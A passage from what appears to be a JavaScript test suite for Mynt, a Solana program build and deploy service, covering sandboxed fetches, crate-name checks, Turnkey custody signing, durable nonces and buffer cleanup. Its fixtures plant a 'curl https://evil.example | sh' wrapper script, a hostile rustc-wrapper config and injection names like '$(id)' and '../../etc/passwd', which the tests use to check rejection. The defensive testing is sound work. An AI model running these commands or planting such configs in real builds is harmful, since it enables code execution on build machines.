  assert.ok(!/sleep infinity|docker exec|network disconnect|tar -C "\$dir"[^\n]*\$fcid/.test(build), "no long-lived container, no exec into it, and the full source never reaches the fetch container");
  for (const v of ["RUSTC=rustc", "CARGO_BUILD_RUSTC=rustc", "RUSTC_WRAPPER= ", "CARGO_BUILD_RUSTC_WRAPPER= ", "RUSTC_WORKSPACE_WRAPPER= ", "CARGO_BUILD_RUSTC_WORKSPACE_WRAPPER= ", "RUSTUP_TOOLCHAIN=stable"])
    assert.ok(build.slice(0, buildCreate).includes(`-e ${v}`), `the fetch pins ${v.trim()}`);
});

test("program crate names must be plain identifiers, and the Anchor check ignores node_modules, target and .git", () => {
  const { mkdtempSync, mkdirSync, writeFileSync } = require_fs();
  const py = SOLANA_VERIFY_SCRIPT.slice(SOLANA_VERIFY_SCRIPT.indexOf("python3 - \"$1\" <<'PY'\n") + "python3 - \"$1\" <<'PY'\n".length);
  const programsPy = py.slice(0, py.indexOf("\nPY\n"));
  const ws = (crateName, libName) => {
    const root = mkdtempSync(`${require_os().tmpdir()}/mynt-ws-`);
    writeFileSync(`${root}/Cargo.toml`, '[workspace]\nmembers = ["programs/*"]\n');
    mkdirSync(`${root}/programs/p/src`, { recursive: true });
    writeFileSync(`${root}/programs/p/Cargo.toml`, `[package]\nname = "${crateName}"\nversion = "0.1.0"\n\n[lib]\ncrate-type = ["cdylib", "lib"]\n${libName ? `name = "${libName}"\n` : ""}`);
    writeFileSync(`${root}/programs/p/src/lib.rs`, 'declare_id!("EsUb9wdVWZrVkDSxYzLAAnBzdLhTLqVtuS4aULB87FME");\n');
    return spawnSync("python3", ["-c", programsPy, root]);
  };
  const good = ws("my-ledger");
  assert.equal(good.status, 0, good.stderr.toString());
  assert.equal(good.stdout.toString().trim(), "programs/p/Cargo.toml\tmy_ledger\tEsUb9wdVWZrVkDSxYzLAAnBzdLhTLqVtuS4aULB87FME");
  for (const [crate, lib] of [["Evil", null], ["x", "../../etc/passwd"], ["x", "a b"], ["x", "$(id)"]]) {
    const r = ws(crate, lib);
    assert.notEqual(r.status, 0, `${crate}/${lib} accepted`);
    assert.match(r.stderr.toString(), /lowercase letters, digits and underscores/);
  }
  // The --fetch check runs the same filter the build uses.
  const line = VERIFY_SCRIPT.split("\n").find((l) => l.includes("tar -tzf \"$V/app.tgz\"") && l.includes("Anchor"));
  const pipeline = line.slice(line.indexOf("| grep -vE") + 2, line.indexOf("; then"));
  const detects = (listing) => spawnSync("bash", ["-c", `printf '%s\\n' ${listing.map((l) => `'${l}'`).join(" ")} | ${pipeline} && echo yes`]).stdout.toString().trim() === "yes";
  assert.equal(detects(["./api/index.ts", "./solana/Anchor.toml"]), true);
  assert.equal(detects(["./Anchor.toml"]), true);
  assert.equal(detects(["./node_modules/pkg/Anchor.toml", "./solana/target/x/Anchor.toml", "./.git/Anchor.toml"]), false);
});

test("an earlier build is adopted from the chain only if it's the owner's (or the firm's) and shipped; the operation stays claimed", async () => {
  const w = await world({ confirmTimeoutMs: 50 });
  const { program_id, build_id: first } = await readyToDeploy(w);
  const chain = w.clusters.devnet;
  const lose = () => (chain.withhold = (tx) => tx.ixs.some((i) => i.program === UPGRADEABLE_LOADER && i.data.readUInt32LE(0) === 2));
  lose();
  await w.ok(w.dev, "deploy_program", { program_id, build_id: first });
  await w.solana.settled(program_id);
  chain.withhold = () => false;
  const second = await w.build();
  const code2 = w.program(1400, 4);
  await w.solana.recordArtifacts(second, [{ name: "mynt_program", declared_id: program_id, sha256: executableHash(code2), size: code2.length, program: code2, idl: null }]);

  // The build on chain belongs to someone outside the owner's firm, or never shipped: not adopted.
  for (const [sql, params] of [
    ["UPDATE financial_products.build_runs SET developer_id = $2 WHERE id = $1", [first, w.otherUser.id]],
    ["UPDATE financial_products.build_runs SET developer_id = $2, status = 'failed' WHERE id = $1", [first, w.devUser.id]],
  ]) {
    await w.db.query(sql, params);
    await w.ok(w.dev, "deploy_program", { program_id, build_id: second });
    await w.solana.settled(program_id);
    const p = await w.ok(w.dev, "get_program", { program_id });
    assert.equal(p.status, "failed");
    assert.match(p.error, /different program already exists/);
  }
  // A firm colleague's shipped build counts.
  await w.store.setUserEntity(w.otherUser.id, w.entity.id);
  await w.db.query("UPDATE financial_products.build_runs SET developer_id = $2, status = 'succeeded' WHERE id = $1", [first, w.otherUser.id]);
  const writes = [];
  const update = w.solana.update.bind(w.solana);
  w.solana.update = async (id, fields) => {
    if ("operation" in fields) writes.push(fields.operation);
    return update(id, fields);
  };
  await w.ok(w.dev, "deploy_program", { program_id, build_id: second });
  await w.solana.settled(program_id);
  const p = await w.ok(w.dev, "get_program", { program_id });
  assert.equal(p.status, "deployed", p.error);
  assert.deepEqual(p.versions.map((v) => [v.action, v.build_id]), [["deploy", first], ["upgrade", second]]);
  // Recording the earlier build hands the operation straight to the upgrade; it's released only at the end.
  assert.deepEqual(writes, ["upgrade", null]);
});

test("custody-service: Turnkey signs mainnet deploys and upgrades; a bad signature is never sent; the custody key never pays for or signs calls", async () => {
  const { fakeTurnkey, apiKeyPair } = await import("./fake-turnkey.js");
  const { TurnkeyClient } = await import("../dist/solana/custody/turnkey.js");
  const tk = await fakeTurnkey();
  const logged = [];
  const orig = { error: console.error, log: console.log, warn: console.warn };
  for (const k of Object.keys(orig)) console[k] = (...a) => logged.push(a.map(String).join(" "));
  try {
    const opts = { organizationId: tk.organizationId, apiPublicKey: tk.apiKey.publicKey, baseUrl: tk.baseUrl, outbound: { allowInsecureLoopback: true }, pollMs: 0 };
    // A Turnkey connection whose key pair doesn't match is reported, not used.
    const broken = await world({ mainnetUrl: "https://rpc.example.com", custody: new TurnkeyClient({ ...opts, apiPrivateKey: apiKeyPair().privateKey }) });
    const st = await broken.ok(broken.admin, "configure_solana_signer", { backend: "custody-service", custody_address: tk.address, enabled: true });
    assert.equal(st.mainnet.ready, false);
    assert.match(st.mainnet.missing.join("; "), /turnkey custody provider isn't usable: TURNKEY_API_PRIVATE_KEY doesn't belong/);

    const w = await world({ mainnetUrl: "https://rpc.example.com", custody: new TurnkeyClient({ ...opts, apiPrivateKey: tk.apiKey.privateKey }) });
    const { program_id } = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "mainnet" });
    const record = async (buildId, code) =>
      w.solana.recordArtifacts(buildId, [{ name: "mynt_program", declared_id: program_id, sha256: executableHash(code), size: code.length, program: code, idl: null }]);
    const b1 = await w.build();
    const code1 = w.program(2500, 1);
    await record(b1, code1);
    // Mainnet gating is unchanged: chosen but not enabled, nothing is signed.
    let ready = await w.ok(w.admin, "configure_solana_signer", { backend: "custody-service", custody_provider: "turnkey", custody_address: tk.address });
    assert.equal(ready.mainnet.ready, false);
    assert.deepEqual(ready.mainnet.missing, ["an admin hasn't enabled mainnet (configure_solana_signer with enabled: true)"]);
    let r = await w.call(w.dev, "deploy_program", { program_id, build_id: b1 });
    assert.match(r.data.error, /hasn't enabled mainnet/);
    assert.equal(tk.requests.length, 0, "nothing went to Turnkey");
    ready = await w.ok(w.admin, "configure_solana_signer", { enabled: true });
    assert.equal(ready.mainnet.ready, true, JSON.stringify(ready.mainnet.missing));
    assert.equal(ready.mainnet.authority, tk.address);
    assert.equal(ready.mainnet.custody_provider, "turnkey");
    // Mynt's deploy payer pays; the custody address only signs, so it needs (and is given) no SOL.
    const payer = ready.mainnet.deploy_payer;
    assert.match(payer, /^[1-9A-HJ-NP-Za-km-z]{32,44}$/);
    assert.notEqual(payer, tk.address);
    assert.match(ready.funding, new RegExp(`Fund the deploy payer ${payer} .*The custody address ${tk.address} needs none`));

    const chain = w.clusters.mainnet;
    chain.fund(payer, 10_000_000_000);
    const custodySigned = () => chain.sent.filter((t) => t.signers.includes(tk.address));
    const bufferKeys = async () => (await w.db.query("SELECT public_key FROM financial_products.solana_keys WHERE role = 'buffer-authority'")).rows;
    const blockhashesBefore = chain.calls.filter((c) => c === "getLatestBlockhash").length;
    await w.ok(w.dev, "deploy_program", { program_id, build_id: b1 });
    await w.solana.settled(program_id);
    let p = await w.ok(w.dev, "get_program", { program_id });
    assert.equal(p.status, "deployed", p.error);
    assert.equal(p.signer_backend, "custody-service");
    assert.equal(p.upgrade_authority, tk.address);
    assert.equal(base58Encode(chain.accounts.get(p.programdata_address).data.subarray(13, 45)), tk.address, "Turnkey's account is the upgrade authority on chain");
    // Turnkey signed exactly one transaction: the buffer's handover and the Deploy, paid for by the deploy payer.
    assert.equal(tk.signed, 1);
    assert.equal(custodySigned().length, 1);
    const [final] = custodySigned();
    assert.equal(final.signers[0], payer, "the deploy payer is the final transaction's fee payer");
    assert.deepEqual(final.ixs.filter((i) => i.program === UPGRADEABLE_LOADER).map((i) => i.data.readUInt32LE(0)), [4, 2], "SetAuthority on the buffer, then Deploy");
    // On the program's durable nonce: AdvanceNonceAccount first, authorised by the deploy payer.
    assert.equal(final.ixs[0].program, SYSTEM_PROGRAM);
    assert.equal(final.ixs[0].data.readUInt32LE(0), 4);
    const nonce = final.ixs[0].accounts[0];
    assert.equal(final.ixs[0].accounts[2], payer);
    assert.equal(chain.accounts.get(nonce).owner, SYSTEM_PROGRAM);
    assert.equal(base58Encode(chain.accounts.get(nonce).data.subarray(8, 40)), payer, "the nonce's authority is the deploy payer");
    assert.equal(chain.nonceAdvances, 1);
    // The buffer was written by a temporary key, never the custody key, each batch on a fresh blockhash.
    const writes = chain.sent.filter((t) => t.ixs.some((i) => i.program === UPGRADEABLE_LOADER && i.data.readUInt32LE(0) === 1));
    assert.equal(writes.length, Math.ceil(code1.length / WRITE_CHUNK));
    const temp = writes[0].signers[0];
    assert.ok(writes.every((t) => t.signers.length === 1 && t.signers[0] === temp) && ![payer, tk.address].includes(temp));
    assert.ok(chain.calls.filter((c) => c === "getLatestBlockhash").length - blockhashesBefore >= Math.ceil(writes.length / 16) + 2);
    // The temporary key's lamports went back to the deploy payer and the key is gone; the custody address holds nothing.
    assert.equal(chain.accounts.get(temp)?.lamports ?? 0, 0);
    assert.deepEqual(await bufferKeys(), []);
    assert.equal(chain.accounts.get(tk.address)?.lamports ?? 0, 0, "the custody address never paid for anything");
    assert.equal(tk.refusedStamps, 0);

    // An upgrade: one Turnkey activity again, waiting for a person's approval. Every recent blockhash expires
    // while they approve; the transaction lands anyway, on the same durable nonce (now advanced), signed once.
    tk.mode = "consensus";
    tk.onPoll = () => chain.expireBlockhashes();
    const b2 = await w.build();
    const code2 = w.program(2600, 2);
    await record(b2, code2);
    await w.ok(w.dev, "upgrade_program", { program_id, build_id: b2 });
    await w.solana.settled(program_id);
    p = await w.ok(w.dev, "get_program", { program_id });
    assert.equal(p.status, "deployed", p.error);
    assert.equal(p.version, 2);
    assert.equal(tk.signed, 2, "one Turnkey signature for the upgrade");
    assert.equal(custodySigned().length, 2);
    const upgrade = custodySigned()[1];
    assert.equal(upgrade.signers[0], payer);
    assert.deepEqual(upgrade.ixs.map((i) => [i.program === SYSTEM_PROGRAM ? "system" : "loader", i.data.readUInt32LE(0)]), [["system", 4], ["loader", 4], ["loader", 3]], "AdvanceNonce, SetAuthority on the buffer, then Upgrade");
    assert.equal(upgrade.ixs[0].accounts[0], nonce, "the program's nonce, reused");
    assert.equal(upgrade.ixs[2].accounts[3], payer, "the buffer's rent comes back to the deploy payer as the spill");
    assert.equal(chain.nonceAdvances, 2);
    assert.ok(tk.requests.some((r) => r.path === "/public/v1/query/get_activity"), "the approval was waited for");
    assert.deepEqual(await bufferKeys(), []);
    tk.onPoll = undefined;
    tk.mode = "sign";

    // Recovery of an interrupted upgrade compares the chain's authority with the custody address; it signs nothing.
    const row = await w.solana.get(program_id);
    const stale = new Date(Date.now() - SolanaService.STALE_OPERATION_MS - 60_000);
    await w.db.query("UPDATE financial_products.solana_programs SET operation = 'upgrade', operation_started_at = $2, pending_build_id = $3, version = 1 WHERE id = $1", [row.id, stale, b2]);
    const signedBefore = tk.signed;
    assert.equal(await w.solana.recoverStale(), 1);
    p = await w.ok(w.dev, "get_program", { program_id });
    assert.equal(p.in_progress, null);
    assert.equal(p.verifiable_hash, executableHash(code2), "adopted from the chain under the custody address");
    assert.equal(tk.signed, signedBefore, "recovery asked Turnkey for nothing");

    // A signature that doesn't verify is refused before anything is sent; the buffer, still the temporary key's,
    // is closed and its rent goes back to the deploy payer.
    tk.mode = "bad-signature";
    const b3 = await w.build();
    await record(b3, w.program(2600, 3));
    const custodySentBefore = custodySigned().length;
    const versionBefore = p.version;
    const payerBefore = chain.accounts.get(payer).lamports;
    await w.ok(w.dev, "upgrade_program", { program_id, build_id: b3 });
    await w.solana.settled(program_id);
    p = await w.ok(w.dev, "get_program", { program_id });
    assert.equal(p.version, versionBefore);
    assert.match(p.error, /doesn't verify for .* it wasn't used/);
    assert.equal(custodySigned().length, custodySentBefore, "nothing signed badly reached the cluster");
    const shape = (t) => t.ixs.map((i) => `${i.program === SYSTEM_PROGRAM ? "s" : i.program === UPGRADEABLE_LOADER ? "l" : "?"}${i.data.readUInt32LE(0)}`).join(",");
    // One transaction from the deploy payer: advance the nonce (every message signed on it is now dead) and close
    // the buffer, on the buffer key's authority.
    const invalidations = () => chain.sent.filter((t) => shape(t) === "s4,l5" || (shape(t) === "s4" && !t.signers.includes(tk.address)));
    assert.equal(invalidations().length, 1);
    assert.equal(invalidations()[0].signers[0], payer);
    assert.deepEqual(await bufferKeys(), []);
    assert.ok(payerBefore - chain.accounts.get(payer).lamports < 100_000, "all but the fees came back to the deploy payer");
    tk.mode = "sign";

    // Every key Mynt makes for a deploy, so a test can sign as Mynt would (to show an old message is dead).
    const madeKeys = (svc) => {
      const made = [];
      const fresh = svc.freshKey.bind(svc);
      svc.freshKey = async (...a) => {
        const k = await fresh(...a);
        made.push(k);
        return k;
      };
      return made;
    };
    const signAll = (wire, keys) => {
      const t = parseTx(wire);
      const sigs = t.signers.map((s) => {
        const k = keys.find((x) => x.address === s);
        assert.ok(k, `no key for ${s}`);
        return Buffer.from(k.sign(t.message));
      });
      return Buffer.concat([Buffer.from([sigs.length]), ...sigs, Buffer.from(t.message)]).toString("base64");
    };

    // A send that fails after Turnkey signed (the connection drops; the transaction may still be out there): the
    // deploy fails, the nonce is advanced and the buffer closed in one go, and the fully signed transaction Mynt
    // tried to send can never land.
    const made = madeKeys(w.solana);
    const b4 = await w.build();
    await record(b4, w.program(2600, 4));
    let inFlight = null;
    const realCall = chain.call.bind(chain);
    chain.call = async (method, params) => {
      if (method === "sendTransaction" && !inFlight && parseTx(Buffer.from(params[0], "base64")).signers.includes(tk.address)) {
        inFlight = params[0];
        throw new Error("connection reset");
      }
      return realCall(method, params);
    };
    try {
      await w.ok(w.dev, "upgrade_program", { program_id, build_id: b4 });
      await w.solana.settled(program_id);
    } finally {
      chain.call = realCall;
    }
    assert.ok(inFlight, "Mynt sent the custody-signed transaction");
    p = await w.ok(w.dev, "get_program", { program_id });
    assert.equal(p.version, versionBefore, "the upgrade didn't happen");
    assert.equal(invalidations().length, 2);
    assert.equal(shape(invalidations()[1]), "s4,l5", "the nonce advanced and the buffer closed, together");
    await assert.rejects(chain.call("sendTransaction", [inFlight]), /nonce has moved/, "the earlier signed transaction is dead");
    assert.deepEqual(await bufferKeys(), []);
    assert.equal(made.length, 2, "a fresh buffer key and buffer for that deploy");

    // A crash mid-write (the process dies: nothing more reaches the cluster, nothing is cleaned up). The next
    // deploy of the program closes the buffer the dead one left, from the address stored with its key, and its
    // rent comes back to the deploy payer. A program whose address someone pre-funded, for the policy's sake.
    const { program_id: second } = await w.ok(w.dev, "reserve_program_id", { name: "mynt_program", cluster: "mainnet" });
    chain.fund(second, 1_000);
    const recordSecond = async (code) => {
      const b = await w.build();
      await w.solana.recordArtifacts(b, [{ name: "mynt_program", declared_id: second, sha256: executableHash(code), size: code.length, program: code, idl: null }]);
      return b;
    };
    const crash = async (buildId, action) => {
      // Two writes get through; then the process is gone, and nothing it sends arrives.
      const call = chain.call.bind(chain);
      let writes = 0;
      let dead = false;
      chain.call = async (method, params) => {
        if (method === "sendTransaction") {
          if (dead) throw new Error("connection reset");
          const t = parseTx(Buffer.from(params[0], "base64"));
          if (t.ixs.some((i) => i.program === UPGRADEABLE_LOADER && i.data.readUInt32LE(0) === 1) && ++writes > 2) {
            dead = true;
            throw new Error("connection reset");
          }
        }
        return call(method, params);
      };
      try {
        await w.ok(w.dev, action, { program_id: second, build_id: buildId });
        await w.solana.settled(second);
      } finally {
        chain.call = call;
      }
      const row = await w.solana.get(second);
      const left = (await w.db.query("SELECT role, public_key FROM financial_products.solana_keys WHERE scope = $1 AND role IN ('buffer', 'buffer-authority')", [row.id])).rows;
      const buffer = left.find((k) => k.role === "buffer")?.public_key;
      assert.ok(buffer && chain.accounts.get(buffer)?.lamports > 0, `the dead deploy left a funded buffer behind (${row.error}; ${JSON.stringify(left)})`);
      assert.equal(left.length, 2, "and its keys, buffer address included");
      return { buffer, id: row.id };
    };
    const big = w.program(WRITE_CHUNK * 4, 6);
    const crashed = await crash(await recordSecond(big), "deploy_program");
    const closeOf = (buffer) => chain.sent.find((t) => t.ixs.some((i) => i.program === UPGRADEABLE_LOADER && i.data.readUInt32LE(0) === 5 && i.accounts[0] === buffer));
    // While the leftover can't be cleaned up (nothing reaches the cluster), a new deploy refuses to start rather
    // than reuse the old buffer key.
    const leftover = (await w.db.query("SELECT role, public_key FROM financial_products.solana_keys WHERE scope = $1 AND role IN ('buffer', 'buffer-authority') ORDER BY role", [crashed.id])).rows;
    const callOk = chain.call.bind(chain);
    chain.call = async (method, params) => {
      if (method === "sendTransaction") throw new Error("connection reset");
      return callOk(method, params);
    };
    try {
      await w.ok(w.dev, "deploy_program", { program_id: second, build_id: await recordSecond(w.program(1800, 10)) });
      await w.solana.settled(second);
    } finally {
      chain.call = callOk;
    }
    const refusedDeploy = await w.ok(w.dev, "get_program", { program_id: second });
    assert.equal(refusedDeploy.status, "failed");
    assert.match(refusedDeploy.error, /left a buffer key .*Nothing was started/);
    assert.deepEqual((await w.db.query("SELECT role, public_key FROM financial_products.solana_keys WHERE scope = $1 AND role IN ('buffer', 'buffer-authority') ORDER BY role", [crashed.id])).rows, leftover, "the old keys untouched, no new ones");
    assert.ok(chain.accounts.get(crashed.buffer)?.lamports > 0);
    await w.ok(w.dev, "deploy_program", { program_id: second, build_id: await recordSecond(w.program(1800, 7)) });
    await w.solana.settled(second);
    assert.equal((await w.ok(w.dev, "get_program", { program_id: second })).status, "deployed");
    assert.equal(chain.accounts.get(crashed.buffer), undefined, "the leftover buffer was closed");
    assert.equal(closeOf(crashed.buffer).ixs[0].accounts[1], payer, "its rent went to the deploy payer");
    // Belt and braces: with the stored address lost too, the loader's own list of the key's buffers finds it.
    const crashed2 = await crash(await recordSecond(w.program(3000, 8)), "upgrade_program"); // three writes, within the 3600 bytes reserved
    await w.db.query("DELETE FROM financial_products.solana_keys WHERE scope = $1 AND role = 'buffer'", [crashed2.id]);
    await w.ok(w.dev, "upgrade_program", { program_id: second, build_id: await recordSecond(w.program(1800, 9)) });
    await w.solana.settled(second);
    assert.equal((await w.ok(w.dev, "get_program", { program_id: second })).version, 2);
    assert.equal(chain.accounts.get(crashed2.buffer), undefined, "found through getProgramAccounts and closed");
    assert.equal(closeOf(crashed2.buffer).ixs[0].accounts[1], payer);
    assert.ok(chain.calls.includes("getProgramAccounts"));
    assert.equal((await w.db.query("SELECT 1 FROM financial_products.solana_keys WHERE role IN ('buffer', 'buffer-authority')")).rows.length, 0);

    // A Turnkey approval that never comes: Mynt gives up, sends nothing, and the buffer is cleaned up the same way.
    const slow = await world({ mainnetUrl: "https://rpc.example.com", custody: new TurnkeyClient({ ...opts, apiPrivateKey: tk.apiKey.privateKey, approvalTimeoutMs: 0, pollMs: 1 }) });
    await slow.ok(slow.admin, "configure_solana_signer", { backend: "custody-service", custody_address: tk.address, enabled: true });
    slow.clusters.mainnet.fund((await slow.ok(slow.admin, "configure_solana_signer", {})).mainnet.deploy_payer, 10_000_000_000);
    const { program_id: slowId } = await slow.ok(slow.dev, "reserve_program_id", { name: "mynt_program", cluster: "mainnet" });
    const bs = await slow.build();
    const cs = slow.program(1500, 5);
    await slow.solana.recordArtifacts(bs, [{ name: "mynt_program", declared_id: slowId, sha256: executableHash(cs), size: cs.length, program: cs, idl: null }]);
    tk.mode = "consensus";
    const slowMade = madeKeys(slow.solana);
    const slowProgramKey = await slow.solana.vaultKey("mainnet", "program", (await slow.solana.get(slowId)).id);
    const asksBefore = tk.requests.filter((q) => q.path === "/public/v1/submit/sign_transaction").length;
    await slow.ok(slow.dev, "deploy_program", { program_id: slowId, build_id: bs });
    await slow.solana.settled(slowId);
    const sp = await slow.ok(slow.dev, "get_program", { program_id: slowId });
    assert.equal(sp.status, "failed");
    assert.match(sp.error, /still ACTIVITY_STATUS_CONSENSUS_NEEDED .*Mynt sent nothing/);
    const slowChain = slow.clusters.mainnet;
    assert.ok(!slowChain.sent.some((t) => t.signers.includes(tk.address)));
    assert.equal((await slow.db.query("SELECT 1 FROM financial_products.solana_keys WHERE role = 'buffer-authority'")).rows.length, 0);
    // Giving up advanced the nonce and closed the buffer in one transaction from the deploy payer.
    const slowPayer = await slow.solana.vaultKey("mainnet", "deploy-payer", "");
    const gaveUp = slowChain.sent.filter((t) => shape(t) === "s4,l5");
    assert.equal(gaveUp.length, 1);
    assert.equal(gaveUp[0].signers[0], slowPayer.address);
    // Someone approves in Turnkey afterwards: the signature comes back, but even with every one of Mynt's own
    // signatures added, the transaction can't land: its nonce has moved.
    const lateAsk = tk.requests.filter((q) => q.path === "/public/v1/submit/sign_transaction")[asksBefore];
    const late = [...tk.activities.values()].find((a) => a.status === "ACTIVITY_STATUS_CONSENSUS_NEEDED" && a.pendingResult);
    assert.ok(lateAsk && late, "the activity Mynt gave up on");
    const lateSigned = Buffer.from(late.pendingResult.signTransactionResult.signedTransaction, "hex");
    assert.ok(lateSigned.subarray(-parseTx(lateSigned).message.length).equals(Buffer.from(JSON.parse(lateAsk.raw).parameters.unsignedTransaction, "hex").subarray(-parseTx(lateSigned).message.length)));
    const replay = signAll(lateSigned, [tk.wallet, slowPayer, slowProgramKey, ...slowMade]);
    await assert.rejects(slowChain.call("sendTransaction", [replay]), /nonce has moved/);
    tk.mode = "sign";

    // The custody key never pays for or signs a developer's call: on mainnet, calls need per-developer vault keys
    // (mainnet-vault); on devnet, they pay with the developer's own fee payer and may not name the custody key.
    const turnkeyRequests = tk.requests.length;
    r = await w.call(w.dev, "call_program", { program_id, instruction: { method: "record", accounts: [] } });
    assert.match(r.data.error, /program calls: they sign with per-developer keys in Mynt's vault/);
    r = await w.call(w.dev, "simulate_program_call", { program_id, instruction: { method: "record", accounts: [] } });
    assert.match(r.data.error, /program calls: they sign with per-developer keys in Mynt's vault/);
    const dn = await readyToDeploy(w);
    await w.ok(w.dev, "deploy_program", { program_id: dn.program_id, build_id: dn.build_id });
    await w.solana.settled(dn.program_id);
    for (const accounts of [[{ pubkey: tk.address, signer: true }], [{ pubkey: tk.address, writable: true }], [{ pubkey: payer, writable: true }]]) {
      r = await w.call(w.dev, "call_program", { program_id: dn.program_id, instruction: { method: "record", accounts } });
      assert.match(r.data.error, /deploy authority/);
    }
    const instruction = { method: "record", accounts: [{ pubkey: "$caller", signer: true }] };
    const sim = await w.ok(w.dev, "simulate_program_call", { program_id: dn.program_id, instruction });
    const sent = await w.ok(w.dev, "call_program", { program_id: dn.program_id, instruction });
    const tx = w.clusters.devnet.sent.find((t) => t.signature === sent.signature);
    assert.deepEqual(tx.signers, [sim.fee_payer, sim.caller], "the developer's own fee payer pays and their caller signs");
    assert.ok(![sim.fee_payer, sim.caller].includes(tk.address));
    assert.ok(!tx.signers.includes(tk.address) && !tx.ixs.some((i) => i.accounts.includes(tk.address)));
    assert.equal(tk.requests.length, turnkeyRequests, "no call reached Turnkey");

    // The Turnkey policy in the docs allows every transaction Mynt asked Turnkey to sign: first deploys (a fresh
    // program account and a pre-funded one), upgrades, retries after a crash.
    const { policyAllows } = await import("./turnkey-policy.js");
    const asked = tk.requests.filter((q) => q.path === "/public/v1/submit/sign_transaction").map((q) => Buffer.from(JSON.parse(q.raw).parameters.unsignedTransaction, "hex"));
    assert.ok(asked.length >= 6);
    for (const wire of asked) assert.ok(policyAllows(wire, tk.address), `the policy refuses Mynt's own transaction ${wire.toString("hex").slice(0, 40)}…`);
    const kinds = new Set(asked.map((wire) => parseTx(wire).ixs.map((i) => `${i.program === SYSTEM_PROGRAM ? "s" : i.program === UPGRADEABLE_LOADER ? "l" : "?"}${i.data.readUInt32LE(0)}`).join(",")));
    assert.ok(kinds.has("s4,s0,l4,l2") && kinds.has("s4,s2,s8,s1,l4,l2") && kinds.has("s4,l4,l3"), [...kinds].join(" | "));

    // The API private key never appears in a response, a log or a program's error.
    const hex = tk.apiKey.privateKey;
    const forms = [hex, hex.toUpperCase(), Buffer.from(hex, "hex").toString("base64"), Buffer.from(hex, "hex").toString("base64url")];
    const seen = [...w.responses, ...broken.responses, ...slow.responses, ...logged].join("\n");
    for (const s of forms) assert.ok(!seen.includes(s), "the Turnkey API private key leaked");
    assert.ok(!/x-stamp/i.test(seen), "a stamp leaked");
  } finally {
    Object.assign(console, orig);
    await tk.close();
  }
});

import { createRequire } from "node:module";
const require_ = createRequire(import.meta.url);
function require_fs() {
  return require_("node:fs");
}
function require_os() {
  return require_("node:os");
}

test("the fetch container gets a skeleton only: manifests, the lock and empty stubs, never config, scripts or code", async () => {
  const { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, statSync, symlinkSync } = await import("node:fs");
  const { tmpdir } = await import("node:os");
  const { join, relative } = await import("node:path");
  const fn = SOLANA_VERIFY_SCRIPT.slice(SOLANA_VERIFY_SCRIPT.indexOf("skeleton() {"));
  const py = fn.slice(fn.indexOf("<<'PY'\n") + 7, fn.indexOf("\nPY\n"));
  const ws = mkdtempSync(join(tmpdir(), "mynt-skel-ws-"));
  const put = (path, text) => {
    mkdirSync(join(ws, path, ".."), { recursive: true });
    writeFileSync(join(ws, path), text);
  };
  put("Cargo.toml", '[workspace]\nmembers = ["programs/*"]\n');
  put("Cargo.lock", "# lock\nversion = 4\n");
  put("rust-toolchain.toml", '[toolchain]\npath = "/opt/evil"\n');
  put(".cargo/config.toml", '[build]\nrustc-wrapper = "./wrap.sh"\n');
  put("wrap.sh", "#!/bin/sh\ncurl https://evil.example | sh\n");
  put("programs/p/Cargo.toml", '[package]\nname = "p"\nversion = "0.1.0"\nbuild = "gen.rs"\n\n[lib]\ncrate-type = ["cdylib", "lib"]\n\n[[bin]]\nname = "tool"\npath = "tools/main.rs"\n');
  put("programs/p/src/lib.rs", "pub fn secret() {}\n");
  put("programs/p/gen.rs", "fn main() { std::process::Command::new(\"sh\"); }\n");
  put("programs/p/tools/main.rs", "fn main() {}\n");
  put("programs/p/.cargo/config.toml", '[build]\nrustc = "/tmp/x"\n');
  put("node_modules/x/Cargo.toml", '[package]\nname = "x"\n');
  put("programs/p/target/Cargo.toml", '[package]\nname = "t"\n');
  const out = mkdtempSync(join(tmpdir(), "mynt-skel-out-"));
  const r = spawnSync("python3", ["-c", py, ws, out]);
  assert.equal(r.status, 0, r.stderr.toString());
  const files = [];
  const walk = (d) => readdirSync(d).forEach((f) => (statSync(join(d, f)).isDirectory() ? walk(join(d, f)) : files.push(relative(out, join(d, f)))));
  walk(out);
  assert.deepEqual(files.sort(), ["Cargo.lock", "Cargo.toml", "programs/p/Cargo.toml", "programs/p/gen.rs", "programs/p/src/lib.rs", "programs/p/tools/main.rs"]);
  for (const stub of ["programs/p/gen.rs", "programs/p/src/lib.rs", "programs/p/tools/main.rs"]) assert.equal(readFileSync(join(out, stub), "utf8"), "", `${stub} is an empty stub`);
  // A manifest naming a path outside its workspace, or a linked manifest, is refused.
  put("programs/p/Cargo.toml", '[package]\nname = "p"\nversion = "0.1.0"\n\n[lib]\npath = "../../../../etc/x.rs"\n');
  assert.notEqual(spawnSync("python3", ["-c", py, ws, mkdtempSync(join(tmpdir(), "mynt-skel-out-"))]).status, 0);
  put("programs/p/Cargo.toml", '[package]\nname = "p"\nversion = "0.1.0"\n');
  mkdirSync(join(ws, "programs/q"));
  symlinkSync("/etc/hostname", join(ws, "programs/q/Cargo.toml"));
  assert.notEqual(spawnSync("python3", ["-c", py, ws, mkdtempSync(join(tmpdir(), "mynt-skel-out-"))]).status, 0);
});

// ---- skeleton targets and the Cargo.lock a build used ----

test("the skeleton stubs where cargo looks for named targets declared without a path, and an implied src/main.rs", async () => {
  const { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, statSync } = await import("node:fs");
  const { tmpdir } = await import("node:os");
  const { join, relative } = await import("node:path");
  const fn = SOLANA_VERIFY_SCRIPT.slice(SOLANA_VERIFY_SCRIPT.indexOf("skeleton() {"));
  const py = fn.slice(fn.indexOf("<<'PY'\n") + 7, fn.indexOf("\nPY\n"));
  const ws = mkdtempSync(join(tmpdir(), "mynt-skel-ws-"));
  const put = (path, text) => {
    mkdirSync(join(ws, path, ".."), { recursive: true });
    writeFileSync(join(ws, path), text);
  };
  put("Cargo.toml", '[workspace]\nmembers = ["programs/*", "tools/*"]\n');
  // A program crate with named targets declared without paths.
  put(
    "programs/p/Cargo.toml",
    '[package]\nname = "p"\nversion = "0.1.0"\n\n[lib]\ncrate-type = ["cdylib", "lib"]\n\n[[bin]]\nname = "admin-cli"\n\n[[bin]]\nname = "p"\n\n[[example]]\nname = "demo"\n\n[[test]]\nname = "flow"\n\n[[bench]]\nname = "speed"\n',
  );
  put("programs/p/src/lib.rs", "pub fn real() {}\n");
  // A binary-only crate: just src/main.rs, no [lib] and no [[bin]].
  put("tools/cli/Cargo.toml", '[package]\nname = "cli"\nversion = "0.1.0"\n');
